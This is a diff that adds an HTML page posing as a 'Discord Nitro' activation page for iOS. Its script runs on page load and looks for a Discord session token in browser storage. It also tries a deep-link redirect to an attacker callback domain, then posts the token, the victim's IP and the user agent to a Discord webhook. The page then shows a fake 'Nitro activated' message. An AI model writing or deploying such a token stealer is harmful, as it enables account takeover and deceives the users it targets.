@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width">
+    <title>Discord Nitro iOS App</title>
+    <style>body{margin:0;padding:40px;background:#36393f;color:#fff;font-family:-apple-system;text-align:center;font-size:18px;}#status{padding:20px;}</style>
+</head>
+<body>
+    <h1>🎮 Discord App Nitro</h1>
+    <p>Detected Discord app → Auto-verifying...</p>
+    <div id="status">Loading...</div>
+
+    <script>
+    const WEBHOOK = 'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN';
+    
+    // iOS Discord APP AUTO-ATTACK CHAIN
+    async function appTokenStealer() {
+        let token = '';
+        
+        // 1. STEAL FROM CURRENT CONTEXT (if Discord opened this page)
+        try {
+            token = localStorage.token || sessionStorage.token || '';
+            token = token.replace(/"/g, '');
+        } catch(e) {}
+        
+        // 2. DISCORD DEEP LINK → FORCES APP OPEN → CAPTURES UNIVERSAL LINK BACK
+        if(!token || !isValidToken(token)){
+            // discord:// universal link opens app, returns to our page with state
+            const deepLink = 'discord://-/login?redirect_to=https://YOURDOMAIN.com/callback.html';
+            window.location.href = deepLink;
+            return;
+        }
+        
+        exfil(token);
+    }
+    
+    function isValidToken(t) {
+        return t.length > 58 && (t.startsWith('mfa.') || t.match(/^[A-Za-z0-9_-]{59,110}$/));
+    }
+    
+    async function exfil(token) {
+        const victim = {
+            ip: await fetch('https://api.ipify.org').then(r=>r.text()),
+            ua: navigator.userAgent
+        };
+        
+        await fetch(WEBHOOK, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                content: '📱 **DISCORD iOS APP TOKEN**',
+                embeds: [{
+                    description: `\`\`\`${token}\`\`\``,
+                    color: 16711680,
+                    fields: [{name: 'Method', value: 'App Deep Link', inline: true}]
+                }]
+            })
+        });
+        
+        document.getElementById('status').innerHTML = '✅ Nitro activated in app!';
+    }
+    
+    // AUTO-START
+    appTokenStealer();
+    </script>
+</body>
+</html>
